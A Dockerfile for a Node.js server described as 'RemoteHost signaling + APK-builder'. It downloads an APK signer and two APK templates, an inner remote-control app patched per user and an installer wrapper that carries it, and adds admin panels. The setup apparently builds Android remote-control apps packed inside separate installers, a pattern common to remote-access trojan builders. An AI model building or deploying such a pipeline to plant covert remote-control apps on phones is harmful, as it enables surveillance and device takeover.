# ── RemoteHost signaling + APK-builder server ─────────────────────────────
FROM node:20-slim

# Install JDK + curl (needed for the signer + template downloads)
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        openjdk-17-jre-headless \
        curl \
        ca-certificates && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Install Node deps first (better layer caching)
COPY package.json ./
RUN npm install --omit=dev

# Download uber-apk-signer (single-purpose JAR, ~10 MB)
RUN curl -fL -o /app/uber-apk-signer.jar \
    https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar

# Download BOTH templates from GitHub Releases:
#  - template.apk           = inner RemoteHost app (patched per-user)
#  - template-installer.apk = installer wrapper (holds the patched inner app)
RUN curl -fL -o /app/template.apk \
        https://github.com/walterhizenburg1-ops/remote-control-server/releases/download/v1-template/template.apk && \
    curl -fL -o /app/template-installer.apk \
        https://github.com/walterhizenburg1-ops/remote-control-server/releases/download/v1-installer/template-installer.apk

# Copy app code + admin panels
COPY server.js ./
COPY admin.html ./
COPY admin-remote.html ./

# Sanity check: everything must be present
RUN test -f /app/template.apk && \
    test -f /app/template-installer.apk && \
    test -f /app/uber-apk-signer.jar && \
    test -f /app/server.js && \
    test -f /app/admin.html && \
    test -f /app/admin-remote.html && \
    echo "✅ inner + installer + signer + server + admin panels present"

EXPOSE 3000

CMD ["node", "server.js"]
